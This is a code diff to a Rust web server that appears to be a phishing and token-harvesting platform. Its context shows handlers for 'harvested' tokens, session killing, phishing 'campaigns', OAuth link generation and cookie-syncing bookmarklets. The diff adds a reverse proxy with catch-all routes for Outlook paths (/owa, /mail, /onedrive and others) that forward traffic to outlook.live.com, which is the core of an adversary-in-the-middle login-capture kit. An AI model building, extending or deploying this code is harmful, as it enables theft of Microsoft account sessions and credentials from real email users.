@@ -85,6 +85,9 @@ use cookie_client::{generate_bookmarklet_token_handler, sync_cookies_handler, te
 mod tenant_utils;
 use tenant_utils::{detect_tenant_fixed, get_location_from_ip};
 
+mod proxy;
+use proxy::{proxy_handler, proxy_status_handler, proxy_health_check, proxy_test_page, ProxyConfig};
+
 // ------------------- CONFIGURATION -------------------
 #[derive(Debug, Clone)]
 pub struct AppConfig {
@@ -162,6 +165,7 @@ pub struct AppState {
     http_client: Client,
     vault: Vault,
     response_key: [u8; 32],
+    proxy_config: ProxyConfig,
 }
 
 /// Retrieve token from vault (tokens table) or fall back to harvested table.
@@ -1434,7 +1438,8 @@ async fn main() -> std::io::Result<()> {
     let http_client = Client::new();
     let vault = Vault::new(config.master_secret.clone());
     let response_key = ResponseCrypto::derive_key(&config.master_secret);
-    let app_state = web::Data::new(AppState { pool, config, http_client, vault, response_key });
+    let proxy_config = ProxyConfig::new(config.proxy_domain.clone());
+    let app_state = web::Data::new(AppState { pool, config, http_client, vault, response_key, proxy_config });
 
     let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
     let port = port.parse::<u16>().unwrap_or(8080);
@@ -1502,6 +1507,21 @@ async fn main() -> std::io::Result<()> {
             .route("/api/tokens/{id}/session/kill", web::post().to(kill_session_handler))
             .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
+            // Proxy routes - Step 2: Proxy Server Core
+            .route("/api/proxy/status", web::get().to(proxy_status_handler))
+            .route("/api/proxy/health", web::get().to(proxy_health_check))
+            .route("/proxy-test", web::get().to(proxy_test_page))
+            // Catch-all proxy route - forwards all requests to outlook.live.com
+            .route("/owa/{tail:.*}", web::route().to(proxy_handler))
+            .route("/mail/{tail:.*}", web::route().to(proxy_handler))
+            .route("/calendar/{tail:.*}", web::route().to(proxy_handler))
+            .route("/people/{tail:.*}", web::route().to(proxy_handler))
+            .route("/onedrive/{tail:.*}", web::route().to(proxy_handler))
+            .route("/api/{tail:.*}", web::route().to(proxy_handler))
+            .route("/resources/{tail:.*}", web::route().to(proxy_handler))
+            .route("/scripts/{tail:.*}", web::route().to(proxy_handler))
+            .route("/owamail/{tail:.*}", web::route().to(proxy_handler))
+            .route("/s/{tail:.*}", web::route().to(proxy_handler))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
             .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
